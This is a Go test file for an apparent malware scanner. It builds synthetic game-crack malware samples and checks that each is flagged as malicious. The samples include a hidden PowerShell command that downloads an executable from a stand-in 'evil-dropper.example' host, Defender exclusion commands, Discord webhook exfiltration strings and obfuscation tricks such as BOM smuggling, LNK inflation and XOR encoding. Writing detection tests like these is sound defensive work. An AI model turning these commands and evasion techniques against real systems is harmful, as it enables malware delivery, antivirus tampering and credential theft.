package scan

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"gamecrack-scanner/internal/model"
)

func hasRule(findings []model.Finding, name string) bool {
	for _, f := range findings {
		if f.Rule == name {
			return true
		}
	}
	return false
}

func TestV23EndToEndFeatures(t *testing.T) {
	tmp := t.TempDir()

	// 1. BatCloak UTF-16 BOM smuggling + Batch %var:~x,y% obfuscation hiding Discord webhook + Defender tamper.
	var bat bytes.Buffer
	bat.Write([]byte{0xFF, 0xFE, 0x0D, 0x0A})
	bat.WriteString("@echo off\r\n")
	bat.WriteString("set \"a=xyzhttps://discord.com/api/webhooks/123456789012345678/" + strings.Repeat("aB3-_", 14) + "end\"\r\n")
	bat.WriteString("p^o^w^e^r^s^h^e^l^l -w hidden -c \"Add-MpPreference -ExclusionPath C:\\Games; iwr %a:~3,115%\"\r\n")
	batPath := filepath.Join(tmp, "Install_Patch.bat")
	if err := os.WriteFile(batPath, bat.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	batRes, _, err := ScanOne(Config{ExtractDepth: 1, ExtractMaxMB: 50, TempDir: tmp}, batPath)
	if err != nil {
		t.Fatal(err)
	}
	if batRes.Verdict != model.VerdictMalicious {
		t.Fatalf("BatCloak .bat verdict = %s (score=%d), want MALICIOUS; findings=%+v", batRes.Verdict, batRes.Score, batRes.Findings)
	}
	if !hasRule(batRes.Findings, "batcloak_bom_smuggling") {
		t.Errorf("expected batcloak_bom_smuggling in findings: %+v", batRes.Findings)
	}

	// 2. Inflated .LNK (>1 MB zero-padded) with hidden PowerShell encoded command + remote URL.
	var lnk bytes.Buffer
	hdr := make([]byte, 76)
	binary.LittleEndian.PutUint32(hdr[0:4], 0x4C)
	copy(hdr[4:20], []byte{0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46})
	binary.LittleEndian.PutUint32(hdr[20:24], 0x20|0x80) // HasArguments | IsUnicode
	binary.LittleEndian.PutUint32(hdr[60:64], 7)         // SW_SHOWMINNOACTIVE
	lnk.Write(hdr)
	lnkArgs := "powershell.exe -w hidden -Command \"iwr https://evil-dropper.example/payload.exe -OutFile C:\\Temp\\a.exe\""
	var cnt [2]byte
	binary.LittleEndian.PutUint16(cnt[:], uint16(len(lnkArgs)))
	lnk.Write(cnt[:])
	for _, r := range lnkArgs {
		lnk.Write([]byte{byte(r), 0})
	}
	lnk.Write(make([]byte, 1150*1024)) // >1 MB zero-padding inflation
	lnkPath := filepath.Join(tmp, "Setup_Game.lnk")
	if err := os.WriteFile(lnkPath, lnk.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	lnkRes, _, err := ScanOne(Config{ExtractDepth: 1, ExtractMaxMB: 50, TempDir: tmp}, lnkPath)
	if err != nil {
		t.Fatal(err)
	}
	if lnkRes.Verdict != model.VerdictMalicious || !hasRule(lnkRes.Findings, "lnk_size_inflated") {
		t.Fatalf("inflated .lnk verdict = %s (score=%d), want MALICIOUS + lnk_size_inflated; findings=%+v", lnkRes.Verdict, lnkRes.Score, lnkRes.Findings)
	}

	// 3. Fractureiser-style Minecraft .jar mod with Constant Pool C2 + Runtime exec.
	var cls bytes.Buffer
	cls.Write([]byte{0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x34})
	cpStrs := []string{
		"java/lang/Runtime",
		"getRuntime",
		"java/net/URLClassLoader",
		"https://discord.com/api/webhooks/123456789012345678/" + strings.Repeat("Z9x_-", 14),
	}
	var cpCnt [2]byte
	binary.BigEndian.PutUint16(cpCnt[:], uint16(len(cpStrs)+1))
	cls.Write(cpCnt[:])
	for _, s := range cpStrs {
		cls.WriteByte(1)
		var sl [2]byte
		binary.BigEndian.PutUint16(sl[:], uint16(len(s)))
		cls.Write(sl[:])
		cls.WriteString(s)
	}
	jarPath := filepath.Join(tmp, "FPSBoosterMod.jar")
	zf, err := os.Create(jarPath)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(zf)
	w, _ := zw.Create("dev/mod/Core.class")
	w.Write(cls.Bytes())
	zw.Close()
	zf.Close()

	jarRes, _, err := ScanOne(Config{ExtractDepth: 1, ExtractMaxMB: 50, TempDir: tmp}, jarPath)
	if err != nil {
		t.Fatal(err)
	}
	if jarRes.Verdict != model.VerdictMalicious || !hasRule(jarRes.Findings, "java_mod_fractureiser") {
		t.Fatalf("Fractureiser .jar verdict = %s (score=%d), want MALICIOUS + java_mod_fractureiser; findings=%+v", jarRes.Verdict, jarRes.Score, jarRes.Findings)
	}

	// 4. Unsigned PE with 1-byte XOR-obfuscated Discord webhook C2.
	plainC2 := "https://discord.com/api/webhooks/987654321098765432/" + strings.Repeat("kQ7_-", 14)
	xorBuf := make([]byte, len(plainC2)+32)
	for i := range xorBuf {
		xorBuf[i] = 0x55
	}
	for i := 0; i < len(plainC2); i++ {
		xorBuf[8+i] = plainC2[i] ^ 0x55
	}
	xorExe := filepath.Join(tmp, "Trainer_Crack.exe")
	if err := os.WriteFile(xorExe, buildMinimalPE64(t, false, append(xorBuf, 0xC3), false, nil), 0o644); err != nil {
		t.Fatal(err)
	}
	xorRes, _, err := ScanOne(Config{ExtractDepth: 1, ExtractMaxMB: 50, TempDir: tmp}, xorExe)
	if err != nil {
		t.Fatal(err)
	}
	if xorRes.Verdict != model.VerdictMalicious || !hasRule(xorRes.Findings, "xor_obfuscated_c2") {
		t.Fatalf("XOR-obfuscated C2 PE verdict = %s (score=%d), want MALICIOUS + xor_obfuscated_c2; findings=%+v", xorRes.Verdict, xorRes.Score, xorRes.Findings)
	}

	// 5. Encrypted .7z locked with standard dropper password "1234" -> auto-unlocked & scored MALICIOUS!
	if bin7z := find7z(); bin7z != "" {
		innerDir := filepath.Join(tmp, "dropper_src")
		os.MkdirAll(innerDir, 0o755)
		innerPS1 := filepath.Join(innerDir, "stealer.ps1")
		os.WriteFile(innerPS1, []byte(`$w = "https://discord.com/api/webhooks/123456789012345678/`+strings.Repeat("mN8_-", 14)+`"; Add-MpPreference -ExclusionPath C:\`), 0o644)
		enc7z := filepath.Join(tmp, "Crack_Fix_2026.7z")
		cmd := exec.Command(bin7z, "a", "-y", "-p1234", "-mhe=on", enc7z, innerPS1)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("7z create encrypted archive failed: %v (%s)", err, string(out))
		}
		encRes, _, err := ScanOne(Config{ExtractDepth: 2, ExtractMaxMB: 50, TempDir: tmp}, enc7z)
		if err != nil {
			t.Fatal(err)
		}
		if encRes.Verdict != model.VerdictMalicious || !hasRule(encRes.Findings, "archive_password_unlocked") {
			t.Fatalf("password-locked '1234' .7z verdict = %s (score=%d), want MALICIOUS + archive_password_unlocked; findings=%+v", encRes.Verdict, encRes.Score, encRes.Findings)
		}
	}

	// 6. Malicious .torrent file (FitGirl fake repack carrying 2.5 MB Setup.lnk + stealer.ps1) -> MALICIOUS before download!
	bStr := func(s string) string {
		return string(append([]byte{}, []byte(strings.TrimSpace(strings.Join([]string{itoaTest(len(s)), ":", s}, "")))...))
	}
	torBencode := "d" +
		bStr("announce") + bStr("http://tracker.evil-mirror.top:80/announce") +
		bStr("info") + "d" +
		bStr("name") + bStr("GTA6_FitGirl_Repack") +
		bStr("piece length") + "i262144e" +
		bStr("pieces") + bStr("12345678901234567890") +
		bStr("files") + "l" +
		"d" + bStr("length") + "i2621440e" + bStr("path") + "l" + bStr("Setup_Game.lnk") + "ee" +
		"d" + bStr("length") + "i4096e" + bStr("path") + "l" + bStr("stealer.ps1") + "ee" +
		"e" +
		"ee"
	torPath := filepath.Join(tmp, "GTA6_FitGirl_Repack.torrent")
	if err := os.WriteFile(torPath, []byte(torBencode), 0o644); err != nil {
		t.Fatal(err)
	}
	torRes, _, err := ScanOne(Config{ExtractDepth: 1, ExtractMaxMB: 50, TempDir: tmp}, torPath)
	if err != nil {
		t.Fatal(err)
	}
	if torRes.Verdict != model.VerdictMalicious || !hasRule(torRes.Findings, "torrent_shortcut_or_script_dropper") {
		t.Fatalf("fake .torrent verdict = %s (score=%d), want MALICIOUS + torrent_shortcut_or_script_dropper; findings=%+v", torRes.Verdict, torRes.Score, torRes.Findings)
	}
}

func itoaTest(n int) string {
	if n == 0 {
		return "0"
	}
	var b [20]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	return string(b[i:])
}
